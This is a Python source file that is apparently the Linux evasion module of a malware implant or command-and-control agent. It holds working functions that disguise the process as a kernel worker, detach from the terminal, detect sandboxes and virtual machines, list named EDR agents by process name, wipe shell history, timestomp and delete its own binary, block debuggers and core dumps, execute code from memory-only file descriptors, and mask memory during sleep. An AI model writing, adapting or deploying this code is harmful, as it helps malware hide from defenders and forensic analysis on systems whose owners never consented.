import os
import sys
import struct
import ctypes
import ctypes.util


def hide_process_name(new_name='kworker/0:0'):
    """Overwrite argv[0] in /proc/self/cmdline to disguise the process

    Works against: ps, top, htop, EDR process listing
    Changes how the process appears in the process table.
    """
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
        # prctl PR_SET_NAME = 15
        libc.prctl(15, new_name.encode()[:15], 0, 0, 0)
        return True
    except Exception:
        return False


def daemonize():
    """Double-fork daemonize to detach from terminal

    Works against: terminal-based process monitoring, session tracking
    """
    try:
        if os.fork() > 0:
            os._exit(0)
        os.setsid()
        if os.fork() > 0:
            os._exit(0)
        sys.stdout.flush()
        sys.stderr.flush()
        devnull = os.open(os.devnull, os.O_RDWR)
        os.dup2(devnull, sys.stdin.fileno())
        os.dup2(devnull, sys.stdout.fileno())
        os.dup2(devnull, sys.stderr.fileno())
        os.close(devnull)
        return True
    except Exception:
        return False


def detect_sandbox():
    """Detect sandbox/VM/container environments

    Works against: Falcon sandbox, any.run, hybrid analysis, Docker/K8s
    """
    import time
    score = 0

    # CPU count
    try:
        if (os.cpu_count() or 1) < 2:
            score += 20
    except Exception:
        pass

    # Uptime check
    try:
        with open('/proc/uptime', 'r') as f:
            uptime = float(f.read().split()[0])
            if uptime < 300:
                score += 20
    except Exception:
        pass

    # Container detection
    try:
        with open('/proc/1/cgroup', 'r') as f:
            cgroup = f.read()
            if 'docker' in cgroup or 'lxc' in cgroup or 'kubepods' in cgroup:
                score += 15
    except Exception:
        pass

    # Check for /.dockerenv
    if os.path.exists('/.dockerenv'):
        score += 20

    # VM detection via DMI
    try:
        for dmi_file in ['/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor']:
            if os.path.exists(dmi_file):
                with open(dmi_file, 'r') as f:
                    content = f.read().lower()
                    for vm_sig in ['virtualbox', 'vmware', 'kvm', 'qemu', 'xen', 'hyper-v']:
                        if vm_sig in content:
                            score += 10
                            break
    except Exception:
        pass

    # Process count
    try:
        proc_count = len([d for d in os.listdir('/proc') if d.isdigit()])
        if proc_count < 20:
            score += 15
    except Exception:
        pass

    # User artifacts
    try:
        home = os.path.expanduser('~')
        file_count = 0
        for d in ['Desktop', 'Documents', 'Downloads', '.bash_history']:
            path = os.path.join(home, d)
            if os.path.exists(path):
                if os.path.isdir(path):
                    try:
                        file_count += len(os.listdir(path))
                    except Exception:
                        pass
                else:
                    file_count += 1
        if file_count < 3:
            score += 10
    except Exception:
        pass

    if score >= 40:
        time.sleep(score)


def detect_edr_processes():
    """Detect Linux EDR agents running on the system"""
    edr_signatures = {
        'CrowdStrike Falcon': ['falcon-sensor', 'falconctl', 'falcond'],
        'Elastic EDR': ['elastic-agent', 'elastic-endpoint', 'auditbeat', 'filebeat'],
        'SentinelOne': ['sentinelagent', 'sentinelone'],
        'Carbon Black': ['cbagentd', 'cbdaemon', 'cbsensor'],
        'Sophos': ['sophos', 'savd', 'sav'],
        'Wazuh': ['wazuh-agent', 'ossec'],
        'OSSEC': ['ossec-syscheckd', 'ossec-logcollector'],
        'Sysdig': ['sysdig', 'falco'],
    }

    detected = {}
    try:
        ps_output = os.popen('ps aux 2>/dev/null').read().lower()
        for edr_name, signatures in edr_signatures.items():
            for sig in signatures:
                if sig in ps_output:
                    if edr_name not in detected:
                        detected[edr_name] = []
                    detected[edr_name].append(sig)
    except Exception:
        pass

    return detected


def clear_bash_history():
    """Clear shell history to remove forensic artifacts"""
    try:
        home = os.path.expanduser('~')
        history_files = [
            os.path.join(home, '.bash_history'),
            os.path.join(home, '.zsh_history'),
            os.path.join(home, '.python_history'),
        ]
        for hf in history_files:
            if os.path.exists(hf):
                with open(hf, 'w') as f:
                    pass
        os.environ.pop('HISTFILE', None)
        os.environ['HISTSIZE'] = '0'
        return True
    except Exception:
        return False


def timestomp(file_path, reference_file='/bin/ls'):
    """Copy timestamps from a reference file to blend in"""
    try:
        ref_stat = os.stat(reference_file)
        os.utime(file_path, (ref_stat.st_atime, ref_stat.st_mtime))
        return True
    except Exception:
        return False


def disable_core_dumps():
    """Prevent core dumps that could leak agent memory to disk"""
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        return True
    except Exception:
        return False


def evade_ptrace():
    """Prevent debugger attachment via prctl PR_SET_DUMPABLE"""
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
        PR_SET_DUMPABLE = 4
        libc.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)
        return True
    except Exception:
        return False


def unlink_self():
    """Delete the agent binary from disk after loading into memory

    Works against: file-based scanning, forensic analysis
    The process continues running from memory after the file is deleted.
    """
    try:
        agent_path = os.path.abspath(sys.argv[0])
        if os.path.exists(agent_path):
            os.unlink(agent_path)
            return True
    except Exception:
        pass
    return False


def memfd_exec(code_bytes):
    """Execute code from an anonymous memory-backed file descriptor

    Works against: file-based EDR scanning, forensic analysis
    Uses memfd_create to create a file that exists only in memory.
    Linux 3.17+.
    """
    try:
        libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
        MFD_CLOEXEC = 0x0001
        fd = libc.syscall(319, b'', MFD_CLOEXEC)  # 319 = memfd_create on x86_64
        if fd < 0:
            return False
        os.write(fd, code_bytes)
        fd_path = f'/proc/self/fd/{fd}'
        os.execve(fd_path, [fd_path], os.environ)
        return True
    except Exception:
        return False


def sleep_encrypt(sleep_seconds, data_to_protect=None):
    """XOR-encrypt sensitive data during sleep intervals"""
    import time
    import random

    if data_to_protect is None:
        time.sleep(sleep_seconds)
        return

    try:
        key = os.urandom(16)
        encrypted = bytearray(len(data_to_protect))
        for i in range(len(data_to_protect)):
            encrypted[i] = data_to_protect[i] ^ key[i % 16]
        for i in range(len(data_to_protect)):
            data_to_protect[i] = random.randint(0, 255)
        time.sleep(sleep_seconds)
        for i in range(len(encrypted)):
            data_to_protect[i] = encrypted[i] ^ key[i % 16]
        del encrypted, key
    except Exception:
        time.sleep(sleep_seconds)


def init_evasion():
    """Master evasion init for Linux"""
    detect_sandbox()
    disable_core_dumps()
    evade_ptrace()
    hide_process_name()
    try:
        timestomp(os.path.abspath(sys.argv[0]))
    except Exception:
        pass
